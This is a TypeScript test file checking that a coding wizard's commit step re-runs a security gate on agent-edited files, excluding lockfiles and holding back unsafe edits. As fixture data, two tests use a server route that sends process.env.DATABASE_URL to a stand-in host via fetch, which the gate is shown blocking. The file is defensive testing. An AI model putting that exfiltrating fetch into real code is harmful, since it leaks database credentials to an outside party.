// Review I1 P1-3: before every commit the post-turn gate runs again on the staged agent files, so a file a
// later process (the wizard's own build running agent code) rewrote past the per-turn gate is never committed.
import { join } from "node:path"

import { afterEach, describe, expect, it } from "vitest"

import { createGitFixture, type GitFixture } from "../../test/wizard/git-fixture.js"
import { fakeBridge, fakeChecks, initialState, RUN_ID, testContext, testDeps } from "../../test/wizard/o4-fakes.js"
import { turnGate } from "../checks/turn-gate.js"
import { createGitOps } from "../git/index.js"
import type { ChecklistItem } from "../wizard/contracts/jobs.js"
import { createScanner } from "./scan.js"
import { stageAndCommit } from "./ship.js"

const fixtures: GitFixture[] = []
afterEach(() => {
  while (fixtures.length > 0) fixtures.pop()!.cleanup()
})

const job: ChecklistItem = {
  id: "server_conversions:signup",
  jobId: "server_conversions",
  n: 8,
  title: "Report conversions from the server",
  owner: "agent",
  trigger: { finding: "f", evidence: [] },
  allow: { files: ["app/api/signup/route.ts"], create: [] },
  checks: [],
  state: "done_in_code"
}

async function commitWith(routeText: string, extra: Record<string, string> = {}, npmFiles: string[] = []) {
  const fx = createGitFixture({ files: { "README.md": "# acme\n", "app/api/signup/route.ts": "export async function POST() {}\n" } })
  fixtures.push(fx)
  fx.git(["checkout", "-q", "-b", "infinite/tag/2026-10-02-7f3c2a"])
  fx.write("app/api/signup/route.ts", routeText)
  for (const [path, text] of Object.entries(extra)) fx.write(path, text)
  const git = createGitOps({ cwd: fx.root, env: fx.env, worktreeRoot: join(fx.dir, "worktrees") })
  const checks = { ...fakeChecks(), turnGate: async (diff: Parameters<typeof turnGate>[0], options: { connectionIds: readonly string[] }) => turnGate(diff, { connectionIds: options.connectionIds, readFile: () => null }, { runId: RUN_ID, now: () => new Date() }) }
  const deps = testDeps({ bridge: fakeBridge(), agents: {} as never, git, host: {} as never, checks })
  const ctx = testContext({ root: fx.root, state: initialState({ jobs: [structuredClone(job)], git: { base: "main", baseSource: "vercel", baseSha: fx.git(["rev-parse", "HEAD"]).trim(), headSha: fx.git(["rev-parse", "HEAD"]).trim(), branch: "infinite/tag/2026-10-02-7f3c2a" } }) })
  const result = await stageAndCommit({
    ctx,
    deps,
    git,
    step: "rehearsal",
    scanner: createScanner({ literals: [], allowedIds: [] }),
    runId: RUN_ID,
    message: "infinite-tag: install",
    round: null,
    allowlist: ["app/api/signup/route.ts"],
    managed: [],
    npmFiles,
    connectionIds: []
  })
  return { fx, result, ctx }
}

describe("stageAndCommit re-runs the post-turn gate on the staged agent files", () => {
  it("never commits a lockfile created by the initial dependency install", async () => {
    const { fx, result } = await commitWith('export async function POST() { return true }\n', {
      "package-lock.json": '{"lockfileVersion":3}\n',
      ".infinite/wizard/dependencies.json": JSON.stringify({ state: "succeeded", createdLockfiles: ["package-lock.json"] })
    }, ["package-lock.json"])
    expect(result.kind).toBe("committed")
    expect(fx.git(["show", "--name-only", "--format=", "HEAD"])).not.toContain("package-lock.json")
    expect(fx.git(["status", "--porcelain", "--", "package-lock.json"])).toContain("?? package-lock.json")
  })
  it("an exfiltrating fetch in a server route is held back, never committed, and its job is blocked", async () => {
    const { fx, result, ctx } = await commitWith('export async function POST() {\n  await fetch("https://e.example/" + process.env.DATABASE_URL)\n}\n')
    expect(result.kind).toBe("nothing")
    expect(fx.git(["log", "--oneline"]).trim().split("\n")).toHaveLength(1)
    expect(ctx.state.get().jobs[0]).toMatchObject({ state: "blocked", blockedReason: "needs_you" })
  })

  it("§3y.8 (P2-5): the receipt quoting a removed non-connection G- id is the wizard's own file: committed, and the count is the commit's", async () => {
    // The live run: the receipt's textEdits quote the duplicate gtag snippet the agent removed (G-TEST0000000 is not a
    // connection id), so the post-turn gate held the receipt back while the line said "3 file(s)".
    const receipt = JSON.stringify({ edits: [{ file: "app/layout.tsx", textEdits: [{ removed: "gtag('config', 'G-TEST0000000')" }] }] }, null, 2)
    const exfiltrating = 'export async function POST() {\n  await fetch("https://e.example/" + process.env.DATABASE_URL)\n}\n'
    const { fx, result } = await commitWith(exfiltrating, { ".infinite/install.json": `${receipt}\n` })
    expect(result.kind).toBe("committed")
    const files = fx.git(["show", "--name-only", "--format=", "HEAD"]).trim().split("\n").filter(Boolean).sort()
    expect(files).toEqual([".infinite/install.json"])
    // The route the gate refused is held back, and the commit line counts ONLY what was committed.
    expect(result.kind === "committed" && result.staged).toEqual([".infinite/install.json"])
  })

  it("negative: a clean agent edit is committed", async () => {
    const { fx, result } = await commitWith('export async function POST() {\n  await reportInfiniteOutcome({ type: "sign_up", eventId: "x" })\n}\n')
    expect(result.kind).toBe("committed")
    expect(fx.git(["log", "--oneline"]).trim().split("\n")).toHaveLength(2)
  })
})
